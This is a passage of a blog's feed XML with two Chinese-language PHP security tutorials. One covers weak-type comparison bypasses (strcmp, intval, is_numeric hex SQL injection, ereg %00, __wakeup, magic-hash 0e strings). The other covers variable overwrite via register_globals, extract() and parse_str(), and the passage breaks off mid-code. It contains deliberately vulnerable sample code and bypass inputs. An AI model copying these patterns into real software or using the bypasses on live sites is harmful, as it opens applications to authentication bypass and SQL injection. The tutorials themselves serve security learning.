    <link href="https://Mi1k7ea.github.com/2019/06/21/PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%E5%B0%8F%E7%BB%93/"/>
    <id>https://Mi1k7ea.github.com/2019/06/21/PHP弱类型小结/</id>
    <published>2019-06-21T14:33:14.000Z</published>
    <updated>2019-06-30T03:19:33.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-弱类型以及-和"><a href="#0x01-弱类型以及-和" class="headerlink" title="0x01  弱类型以及==和==="></a>0x01  弱类型以及==和===</h2><p>先看下强类型和弱类型的区别。</p><p>强类型指的是每个变量和对象都必须具有声明类型，是在编译的时候就确定类型的数据，在执行时类型不能更改，代表语言如Java、C等；而弱类型在执行的时候才会确定类型， 代表语言如PHP、Python等。</p><p>强类型较安全，而且效率高；弱类型相比而言不安全 。</p><p><strong>==和===</strong></p><p>===在进行比较的时候，会先判断两个变量的类型是否相等，再比较；==在进行比较的时候，会先将变量类型转化成相同，再比较。也就是说，相比之前，==并不会去比较两个变量的类型是否相等。</p><p>除此之外，还有!=和!==，原理和前面一样。</p><p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump(<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">1</span>); <span class="comment">//false</span></span><br><span class="line">var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>); <span class="comment">//true</span></span><br><span class="line">var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>观察上述代码，”admin”==0 比较的时候，会将admin强制转化成数值，由于admin是字符串，转化的结果是0，自然和0相等；</li><li>“1admin”==1 比较的时候会将1admin强制转化成数值，结果为1，而”admin1”==1等于错误，也就是”admin1”被强制转化成了0，为什么呢？——<strong>当一个字符串被当作一个数值来取值，其结果和类型如下：如果该字符串没有包含’.’、’e’、’E’并且其数值值在整形的范围之内，则该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0；</strong></li><li>“0e123456”==”0e456789”比较的时候，会将0e这类字符串识别为科学计数法的数字，0的无论多少次方都是零，所以相等；</li></ul><h2 id="0x02-strcmp"><a href="#0x02-strcmp" class="headerlink" title="0x02 strcmp()"></a>0x02 strcmp()</h2><p>strcmp(str1, str2)函数用于比较两个字符串是否一致，若一致则返回0，若str1&gt;str2则返回&gt;0，若str1&lt;str2则返回&lt;0。</p><p>在PHP版本为5.3.3至5.5中（不包含5.5），当比较数组和字符串的时候，返回值也是0，即可以通过赋值其中一个参数为数组来Bypass：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"2398ruuu31fj81k2rio8hg9302i9e1i2098t95yh"</span>;</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span> (!strcmp($a, $b)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass by strcmp()!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>在本地测试的PHP版本是5.6，处理弹出警告信息说第二个参数应该给string型外，还是能够成功Bypass：</p><p><img src="/2019/06/21/PHP弱类型小结/1.png" alt=""></p><h2 id="0x03-intval"><a href="#0x03-intval" class="headerlink" title="0x03 intval()"></a>0x03 intval()</h2><p>intval(var)函数用于获取变量的整数值。在转换时，函数会从字符串起始处进行转换直到遇到一个非数字的字符，即使出现无法转换的字符串也不会报错而是返回0，从而可以导致如下情形的Bypass：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line"><span class="keyword">if</span> (intval($a) === <span class="number">666</span>) &#123;</span><br><span class="line">$sql = <span class="string">"Select a From Table Where Id="</span>.$a;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/21/PHP弱类型小结/2.png" alt=""></p><h2 id="0x04-md5-和sha1"><a href="#0x04-md5-和sha1" class="headerlink" title="0x04 md5()和sha1()"></a>0x04 md5()和sha1()</h2><p>md5()和sha1()都用于计算字符串的散列值，但是两者都无法处理数组、不会抛出异常而是直接返回false。</p><p>如下情形，要求输入两个数使得一个参数的md5值和另一个参数的sha1值相等，当都输入数组时会导致NULL=NULL从而Bypass：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = $_GET[<span class="string">'a'</span>];</span><br><span class="line">$b = $_GET[<span class="string">'b'</span>];</span><br><span class="line"><span class="keyword">if</span> (md5($a) === sha1($b)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass md5() and sha1()!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/21/PHP弱类型小结/3.png" alt=""></p><h2 id="0x05-is-numeric"><a href="#0x05-is-numeric" class="headerlink" title="0x05 is_numeric()"></a>0x05 is_numeric()</h2><p>is_numeric()函数用于检测变量是否为数字或数字字符串。</p><p>但是函数的范围比较广泛，不仅仅是十进制的数字，其可被十六进制的值进行绕过，如下情形可造成二次注入：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$name = $_GET[<span class="string">'name'</span>];</span><br><span class="line">$con = mysql_connect(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">"hehe123"</span>);</span><br><span class="line"><span class="keyword">if</span> (!$con)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_select_db(<span class="string">"test"</span>, $con);</span><br><span class="line"><span class="keyword">if</span> (is_numeric($name)) &#123;</span><br><span class="line">mysql_query(<span class="string">"insert into users values (3,"</span> . $name . <span class="string">",'test')"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>1′ union select 1,2,3的十六进制为0x312720756e696f6e2073656c65637420312c322c33</p><p>访问：<a href="http://127.0.0.1/x.php?name=0x312720756e696f6e2073656c65637420312c322c33" target="_blank" rel="noopener">http://127.0.0.1/x.php?name=0x312720756e696f6e2073656c65637420312c322c33</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from users;</span><br><span class="line"></span><br><span class="line">+----+-----------------------+----------+</span><br><span class="line">| id | username              | password |</span><br><span class="line">+----+-----------------------+----------+</span><br><span class="line">|  3 | 1&apos; union select 1,2,3 | test     |</span><br><span class="line">+----+-----------------------+----------+</span><br><span class="line"></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure><h2 id="0x06-in-array"><a href="#0x06-in-array" class="headerlink" title="0x06 in_array()"></a>0x06 in_array()</h2><p>in_array()函数用来判断一个值是否在某一个数组列表里面。其缺陷在于存在自动类型转换，如下当输入数字1后再紧跟其他字符串能够Bypass检测数组的功能：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="keyword">if</span> (in_array($id, <span class="keyword">array</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">0</span>))) &#123;</span><br><span class="line">$sql = <span class="string">"Select a From users Where Id='"</span>.$id.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/21/PHP弱类型小结/4.png" alt=""></p><h2 id="0x07-ereg-和eregi"><a href="#0x07-ereg-和eregi" class="headerlink" title="0x07 ereg()和eregi()"></a>0x07 ereg()和eregi()</h2><p>ereg()和eregi()函数都用于正则匹配，两者的区别在于是否区分大小写，使用指定的模式搜索一个字符串中指定的字符串，如果匹配成功则返回true，否则返回false。</p><p>该函数可被%00截断来Bypass：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$passwd = $_GET[<span class="string">'passwd'</span>];</span><br><span class="line"><span class="keyword">if</span> (@ereg(<span class="string">"^[a-zA-Z0-9_]+$"</span>, $passwd)) &#123;</span><br><span class="line">$sql = <span class="string">"Select username From users Where password='"</span>.$passwd.<span class="string">"'"</span>;</span><br><span class="line"><span class="keyword">echo</span> $sql;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/21/PHP弱类型小结/5.png" alt=""></p><h2 id="0x08-wakeup"><a href="#0x08-wakeup" class="headerlink" title="0x08 __wakeup()"></a>0x08 __wakeup()</h2><p>__wakeup()作为反序列化中的一个魔法函数，自unserialize()从字节流中创建了一个对象后，程序会马上检测是否具有__wakeup()函数存在。若存在，__wakeup()函数会立即被调用。</p><p>使用__wakeup()函数的目的是重建在序列化中可能丢失的任何数据库连接以及处理其它重新初始化的任务。</p><p>在如下情形中，在序列化字符串中，前面的数字代表的是后面字符串中字符的个数，如果数字与字符个数不匹配的话，就会报错，因此将1改成2会产生报错，导致不会去执行__wakeup()函数，从而Bypass：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Mi1k7ea</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="keyword">public</span> $text = <span class="string">"h12r0h1f0jfj"</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">"[!]Bad Request."</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo serialize(new Mi1k7ea());</span></span><br><span class="line"><span class="comment">// O:7:"Mi1k7ea":1:&#123;s:4:"text";s:12:"h12r0h1f0jfj";&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> unserialize($_GET[<span class="string">'flag'</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass __wakeup()!"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输入正常的序列化内容是会执行__wakeup()函数的：</p><p><img src="/2019/06/21/PHP弱类型小结/6.png" alt=""></p><p>输入不正常的序列化内容，将数字改为与字符个数不匹配则可以Bypass：</p><p><img src="/2019/06/21/PHP弱类型小结/7.png" alt=""></p><h2 id="0x09-json-decode"><a href="#0x09-json-decode" class="headerlink" title="0x09 json_decode()"></a>0x09 json_decode()</h2><p>json_decode()函数用于对json格式数据进行json解码操作，对于一个json类型的字符串，会解密成一个数组。</p><p>其存在一个0==”efeaf”的Bypass缺陷：=</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$key = <span class="string">"JsonTest"</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>])) &#123;</span><br><span class="line">$data = json_decode($_GET[<span class="string">'data'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($data-&gt;key == $key) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Bypass json_decode()!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"No..."</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2019/06/21/PHP弱类型小结/8.png" alt=""></p><h2 id="0x10-md5-哈希碰撞"><a href="#0x10-md5-哈希碰撞" class="headerlink" title="0x10 md5()哈希碰撞"></a>0x10 md5()哈希碰撞</h2><p>md5()哈希碰撞是基于弱类型==或!=的。</p><p>下面看个题目，大意是要输入一个字符串和数字类型，并且他们的md5值相等，就可以成功执行下一步语句 ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">$logined = <span class="keyword">true</span>;</span><br><span class="line">$username = $_GET[<span class="string">'username'</span>];</span><br><span class="line">$password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ctype_alpha($username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span> (md5($username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line"><span class="keyword">if</span> ($logined)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>前面提到过，0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过：</p><p><img src="/2019/06/21/PHP弱类型小结/9.png" alt=""></p><p>介绍一批md5开头是0e的字符串 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">  </span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">  </span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">  </span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">  </span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">  </span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>PHP变量覆盖漏洞小结</title>
    <link href="https://Mi1k7ea.github.com/2019/06/20/PHP%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://Mi1k7ea.github.com/2019/06/20/PHP变量覆盖漏洞/</id>
    <published>2019-06-20T13:34:18.000Z</published>
    <updated>2019-06-20T15:46:32.837Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>变量覆盖即通过外部输入将某个变量的值给覆盖掉。</p><p>通常将可以用自定义的参数值替换原有变量值的情况称为变量覆盖漏洞。</p><h2 id="0x02-register-globals全局变量覆盖"><a href="#0x02-register-globals全局变量覆盖" class="headerlink" title="0x02 register_globals全局变量覆盖"></a>0x02 register_globals全局变量覆盖</h2><p>php.ini中有一项为register_globals，即注册全局变量，当register_globals=On时，传递过来的值会被直接的注册为全局变量直接使用，而register_globals=Off时，我们需要到特定的数组里去得到它。</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/1.png" alt=""></p><p><strong>注意：register_globals已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。</strong></p><p>当register_globals=On，变量未被初始化且能够用户所控制时，就会存在变量覆盖漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Register_globals: "</span> . (int)ini_get(<span class="string">"register_globals"</span>) . <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($a) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过GET和POST方式输入变量a的值：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/2.png" alt=""></p><p>当然，也可以从COOKIE中输入：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/3.png" alt=""></p><h2 id="0x03-extract-变量覆盖"><a href="#0x03-extract-变量覆盖" class="headerlink" title="0x03 extract()变量覆盖"></a>0x03 extract()变量覆盖</h2><p>extract()函数从数组中将变量导入到当前的符号表。该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int extract ( <span class="keyword">array</span> $var_array [, int $extract_type [, string $prefix ]] )</span><br></pre></td></tr></table></figure><p>其中，第二个参数指定函数将变量导入符号表时的行为，最常见的两个值是EXTR_OVERWRITE和EXTR_SKIP。</p><p>当值为EXTR_OVERWRITE时，在将变量导入符号表的过程中，如果变量名发生冲突，则覆盖所有变量；值为EXTR_SKIP则表示跳过不覆盖。若第二个参数未指定，则在默认情况下使用EXTR_OVERWRITE。</p><p>当extract()函数从用户可以控制的数组中导出变量且第二个参数未设置或设置为EXTR_OVERWRITE时，就存在变量覆盖漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"0"</span>;</span><br><span class="line">extract($_GET);</span><br><span class="line"><span class="keyword">if</span> ($a == <span class="number">1</span>) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hacked!"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>以上示例是以GET为例：</p><p><img src="/2019/06/20/PHP变量覆盖漏洞/4.png" alt=""></p><p>防御方法：在调用extract()时使用EXTR_SKIP保证已有变量不会被覆盖</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extract($_GET,EXTR_SKIP);</span><br></pre></td></tr></table></figure><h2 id="0x04-parse-str-变量覆盖"><a href="#0x04-parse-str-变量覆盖" class="headerlink" title="0x04 parse_str()变量覆盖"></a>0x04 parse_str()变量覆盖</h2><p>parse_str()函数通常用于解析URL中的querystring，把查询字符串解析到变量中，如果没有array参数，则由该函数设置的变量将覆盖已存在的同名变量。</p><p>函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void parse_str ( string $str [, <span class="keyword">array</span> &amp;$arr ])</span><br></pre></td></tr></table></figure><p>当parse_str()函数的参数值可以被用户控制时，则存在变量覆盖漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span 